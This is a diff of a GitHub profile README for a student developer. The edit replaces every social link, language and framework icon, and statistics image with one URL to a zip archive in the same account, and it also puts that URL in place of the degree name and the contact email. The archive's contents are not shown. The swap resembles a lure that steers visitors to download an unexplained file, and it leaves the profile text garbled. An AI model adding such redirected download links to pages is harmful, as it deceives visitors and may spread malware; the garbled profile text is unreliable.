@@ -4,67 +4,67 @@
   align="right"
   width="400"
   alt="Coding"
-  src="https://i.pinimg.com/originals/09/c7/4c/09c74c130718ce11e07c2d16c558e116.gif"
+  src="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
 />
 
-- 🏫 Final Year at IIIT Nagpur pursuing B.Tech in ECE
+- 🏫 Final Year at IIIT Nagpur pursuing https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip in ECE
 - 🔭 I’m currently working on **Front End**
 - 💻 Apart from this hands on **Data Structures and Algorithm**
-- 📫 How to reach me **pranavchaure69@gmail.com**
+- 📫 How to reach me **https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip**
 
 <h3 align="left">Connect with me:</h3>
 <p align="left">
-  <a href="https://www.linkedin.com/in/pranav-chaure-ab574722b/" target="blank">
+  <a href="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip" target="blank">
     <img
       align="center"
-      src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/linked-in-alt.svg"
+      src="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
       alt="pranav chaure"
       height="30"
       width="40"
   /></a>
   <h3 align="left">Coding Platform:</h3>
 <p align="left">
-  <a href="https://leetcode.com/u/Pranav0415/" target="blank">
+  <a href="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip" target="blank">
     <img
       align="center"
-      src = "https://www.svgrepo.com/show/306328/leetcode.svg"
+      src = "https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
       alt="Leetcode"
       height="30"
       width="40"
   /></a>
 </p>
 <h3 align="left">Languages:</h3>
-  <a href="https://www.w3schools.com/cpp/" target="_blank" rel="noreferrer">
+  <a href="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip" target="_blank" rel="noreferrer">
     <img
-      src="https://raw.githubusercontent.com/devicons/devicon/master/icons/cplusplus/cplusplus-original.svg"
+      src="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
       alt="cplusplus"
       width="40"
       height="40"
     />
   </a>
-   <a href="https://www.w3.org/html/" target="_blank" rel="noreferrer">
+   <a href="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip" target="_blank" rel="noreferrer">
     <img
-      src="https://raw.githubusercontent.com/devicons/devicon/master/icons/html5/html5-original-wordmark.svg"
+      src="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
       alt="html5"
       width="40"
       height="40"
     />
   </a>
-  <a href="https://www.w3schools.com/css/" target="_blank" rel="noreferrer">
+  <a href="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip" target="_blank" rel="noreferrer">
     <img
-      src="https://raw.githubusercontent.com/devicons/devicon/master/icons/css3/css3-original-wordmark.svg"
+      src="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
       alt="css3"
       width="40"
       height="40"
     />
   </a>
    <a
-    href="https://developer.mozilla.org/en-US/docs/Web/JavaScript"
+    href="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
     target="_blank"
     rel="noreferrer"
   >
   <img
-      src="https://raw.githubusercontent.com/devicons/devicon/master/icons/javascript/javascript-original.svg"
+      src="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
       alt="javascript"
       width="40"
       height="40"
@@ -72,33 +72,33 @@
   </a>
 </p>
   <h3 align="left">Frameworks:</h3>
-    <a href="https://reactjs.org/" target="_blank" rel="noreferrer">
+    <a href="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip" target="_blank" rel="noreferrer">
     <img
-      src="https://raw.githubusercontent.com/devicons/devicon/master/icons/react/react-original-wordmark.svg"
+      src="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
       alt="react"
       width="40"
       height="40"
     />
   </a>
-    <a href="https://nodejs.org" target="_blank" rel="noreferrer">
+    <a href="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip" target="_blank" rel="noreferrer">
     <img
-      src="https://raw.githubusercontent.com/devicons/devicon/master/icons/nodejs/nodejs-original-wordmark.svg"
+      src="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
       alt="nodejs"
       width="40"
       height="40"
     />
   </a>
- <a href="https://Nextjs.com/" target="_blank" rel="noreferrer">
+ <a href="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip" target="_blank" rel="noreferrer">
     <img
-      src="https://www.svgrepo.com/show/354113/nextjs-icon.svg"
+      src="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
       alt="Nextjs"
       width="40"
       height="40"
     />
   </a>
-  <a href="https://tailwindcss.com/" target="_blank" rel="noreferrer">
+  <a href="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip" target="_blank" rel="noreferrer">
     <img
-      src="https://www.vectorlogo.zone/logos/tailwindcss/tailwindcss-icon.svg"
+      src="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
       alt="tailwind"
       width="40"
       height="40"
@@ -107,7 +107,7 @@
 <p>
 <h3 align="left">Tools and Database:</h3>
 <p align="left">
-  <a href="https://tailwindcss.com/" target="_blank" rel="noreferrer">
+  <a href="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip" target="_blank" rel="noreferrer">
     <img
       src=""
       alt=""
@@ -118,7 +118,7 @@
 </p>
   <img
     align="center"
-    src="https://github-readme-stats.vercel.app/api/top-langs?username=pranavchaure&show_icons=true&locale=en&layout=compact"
+    src="https://raw.githubusercontent.com/Pranavchaure/Pranavchaure/main/pavidity/Pranavchaure_create.zip"
     alt="pranavchaure"
   />
 </p>
